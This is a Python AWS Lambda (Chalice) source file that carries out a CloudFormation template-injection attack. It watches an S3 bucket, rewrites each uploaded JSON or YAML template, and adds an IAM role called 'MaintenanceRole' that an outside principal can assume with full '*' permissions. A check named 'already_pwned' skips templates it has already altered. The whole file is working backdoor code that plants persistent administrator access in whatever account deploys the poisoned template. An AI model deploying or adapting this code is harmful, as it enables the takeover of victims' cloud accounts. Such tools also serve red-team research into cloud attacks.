import enum
import json
import os

from chalice import Chalice
from chalice.app import S3Event

import boto3
import yaml
from typing import TYPE_CHECKING


app = Chalice(app_name="cfn__resource_injection")


class CfnType(enum.Enum):
    YAML = 0
    JSON = 1


# The Role name is used to check if the lambda has already updated the template. It's important to ensure this doesn't
# break, if it does the lambda may end up endlessly triggering itself.
# TODO: Figure out a better way to check if a notification is for an already updated file.
BACKDOORED_IAM_ROLE_NAME = b'MaintenanceRole'

if TYPE_CHECKING:
    import mypy_boto3_s3

sess = boto3.session.Session(
    aws_access_key_id=os.getenv('S3_AWS_ACCESS_KEY_ID'),
    aws_secret_access_key=os.getenv('S3_AWS_SECRET_ACCESS_KEY'),
    aws_session_token=os.getenv('S3_AWS_SESSION_TOKEN') or None,
)

s3: 'mypy_boto3_s3.S3Client' = sess.client('s3', region_name='us-east-1')


@app.lambda_function()
def update_template(event: dict, context: dict):
    event = S3Event(event, context)

    arn = sess.client('sts').get_caller_identity()['Arn']
    print(f"Caller identity used for updating cross account S3 Objects: {arn}")

    update(s3, event.bucket, event.key)

    return {
        "statusCode": 200,
        "body": '{ "message": "template updated"}',
    }


def update(s3, bucket: str, key: str):
    body = fetch(s3, bucket, key)

    if already_pwned(body):
        print("already pwned skipping")
        return None

    new_body = add_role_bytes(body)
    s3.put_object(Bucket=bucket, Key=key, Body=new_body)


def already_pwned(body: bytes) -> bool:
    return BACKDOORED_IAM_ROLE_NAME in body


def fetch(s3, bucket: str, key: str):
    resp = s3.get_object(Bucket=bucket, Key=key)
    return resp['Body'].read()


def add_role_bytes(cfn: bytes) -> str:
    try:
        cfn = json.loads(cfn)
        cfn_type = CfnType.JSON
    except json.JSONDecodeError:
        print("[INFO] Input is not json, likely yaml")
        cfn = yaml.safe_load(cfn)
        cfn_type = CfnType.YAML

    cfn = add_role_dict(cfn)

    if cfn_type == CfnType.JSON:
        cfn = json.dumps(cfn)
    elif cfn_type == CfnType.YAML:
        cfn = yaml.safe_dump(cfn)
    else:
        raise Exception(f"unexpected CfnType: {cfn_type.name}")
    return cfn


def add_role_dict(cfn: dict) -> dict:
    principal = os.environ['PRINCIPAL']
    if not principal:
        raise UserWarning("Could not find PRINCIPAL in the environment.")
    cfn['Resources'][BACKDOORED_IAM_ROLE_NAME.decode()] = {
        'Type': 'AWS::IAM::Role',
        'Properties': {
            'AssumeRolePolicyDocument': json.dumps(
                {
                    "Version": "2012-10-17",
                    "Statement": [
                        {
                            "Effect": "Allow",
                            "Principal": {"AWS": principal.strip()},
                            "Action": "sts:AssumeRole"
                        }
                    ]
                }
            ),
            "Policies": [
                {
                    "PolicyName": "default",
                    "PolicyDocument": {
                        "Version": "2012-10-17",
                        "Statement": [
                            {
                                "Effect": "Allow",
                                "Action": "*",
                                "Resource": "*"
                            }
                        ]
                    }
                }
            ]
        }
    }
    return cfn

